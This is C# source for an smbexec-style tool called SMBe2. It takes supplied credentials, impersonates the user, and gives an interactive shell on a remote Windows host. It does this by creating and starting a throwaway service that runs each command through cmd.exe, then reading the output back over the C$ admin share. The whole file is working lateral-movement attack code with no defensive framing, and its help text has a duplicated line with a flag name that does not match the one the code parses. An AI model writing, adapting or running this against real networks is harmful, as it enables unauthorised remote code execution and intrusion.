using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace SMBe2
{
    class Program
    {
        // --- Win32 API Imports ---
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool StartService(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        const uint SERVICE_ALL_ACCESS = 0xF01FF;
        const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        const uint SERVICE_DEMAND_START = 0x00000003;
        const uint SERVICE_ERROR_IGNORE = 0x00000000;

        static string g_SvcName = null;
        static string logtoremotehost = "false";

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                PrintHelp();
                return;
            }

            string user = "";
            string pass = "";
            string domain = ".";
            string host = "";

            // Parsing arguments with spaces (e.g., -uuser Administrator)
            for (int i = 0; i < args.Length; i++)
            {
                try
                {
                    switch (args[i].ToLower())
                    {
                        case "-uuser": user = args[++i]; break;
                        case "-upassword": pass = args[++i]; break;
                        case "-udomain": domain = args[++i]; break;
                        case "-uhost": host = args[++i]; break;
                        case "-uservicename": g_SvcName = args[++i]; break;
                        // Added these based on your list, can be used for logging/extensibility
                        case "-ulogtoremotehost": logtoremotehost = args[++i]; break;
                       
                    }
                }
                catch { Console.WriteLine($"[-] Missing value for argument {args[i - 1]}"); return; }
            }
            g_SvcName = g_SvcName ?? ("Svc" + Guid.NewGuid().ToString().Substring(0, 8));
            if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user))
            {
                Console.WriteLine("[-] Critical missing arguments. Ensure -uhost and -uuser are provided.");
                return;
            }


            if (LogonUser(user, domain, pass, 9, 0, out IntPtr token))
            {
                if (ImpersonateLoggedOnUser(token))
                {
                    Console.WriteLine($"[*] Successfully impersonated {domain}\\{user}");
                    RunInteractiveShell(host);
                    RevertToSelf();
                }
            }
            else
            {
                Console.WriteLine($"[-] Authentication failed: {Marshal.GetLastWin32Error()}");
            }
        }

        static void RunInteractiveShell(string target)
        {
            string outputFileName = "__output_" + Guid.NewGuid().ToString().Substring(0, 8);
            string remotePath = $@"\\{target}\C$\Windows\Temp\{outputFileName}";
            Console.WriteLine($"Writing to remote host: {outputFileName}");
            Console.WriteLine($"[!] Interactive Session for {target} (Type 'exit' to quit)");

            while (true)
            {
                Console.Write($"{target}> ");
                string input = Console.ReadLine();

                if (string.IsNullOrEmpty(input)) continue;
                if (input.ToLower() == "exit")
                {
                    if (logtoremotehost != "true")
                    {
                        File.Delete(remotePath);
                    }
                        break;
                }

                // Build payload
                //string payload = $"cmd.exe /c {input} > C:\\Windows\\Temp\\{outputFileName} 2>&1";
                string payload = "cmd.exe /c \" " + input + " > C:\\Windows\\Temp\\" + outputFileName + " 2>&1 \"";

                if (logtoremotehost == "true")
                {
                    payload = "cmd.exe /c \" " + input + " >> C:\\Windows\\Temp\\" + outputFileName + " 2>&1 \"";

                    //payload = $"cmd.exe /c {input} >> C:\\Windows\\Temp\\{outputFileName} 2>&1";
                    Console.WriteLine($"Writing to remote host: {outputFileName}");

                }

                ExecuteCommandViaService(target, payload);

                // Short wait for file write
                //Thread.Sleep(500);

                try
                {
                    if (File.Exists(remotePath))
                    {
                        Console.WriteLine(File.ReadAllText(remotePath));
                        if (logtoremotehost=="true")
                        {
                            Console.WriteLine($"[!] Output file retained at {remotePath}");
                        }
                        else
                        {
                            File.Delete(remotePath);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Command executed but no output file found.");
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error reading output: {e.Message}");
                }
            }
        }

        static void ExecuteCommandViaService(string target, string payload)
        {
            IntPtr scm = OpenSCManager(target, null, SC_MANAGER_ALL_ACCESS);

            if (scm == IntPtr.Zero) return;

            string binaryPath = $"cmd.exe /c \"{payload}\"";

            IntPtr svc = CreateService(scm, g_SvcName, g_SvcName, SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                binaryPath, null, IntPtr.Zero, null, null, null);
            Console.WriteLine($"[*] Created service {g_SvcName}");
            if (svc != IntPtr.Zero)
            {
                StartService(svc, 0, null);
                //Thread.Sleep(300);
                DeleteService(svc);
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }

        static void PrintHelp()
        {
            Console.WriteLine("SMBe2 Executable - Usage:");
            Console.WriteLine("  -uhost <ip/name>        Target host");
            Console.WriteLine("  -uuser <username>       Target user");
            Console.WriteLine("  -upassword <password>   Target password");
            Console.WriteLine("  -udomain <domain>       Target domain");
            Console.WriteLine("  -uservicename <name>    Custom service name");
            Console.WriteLine("  -ulogremotehost true/false    keeps log of file on host in c:\\windows\\temp\\<randomuuid> for retrieval");
            Console.WriteLine("  -ulogremotehost true/false    keeps log of file on host in c:\\windows\\temp\\<randomuuid> for retrieval");

            Console.WriteLine("\nExample: smbexec.exe -uhost 10.0.0.5 -uuser Admin -upassword Secret123");
        }
    }
}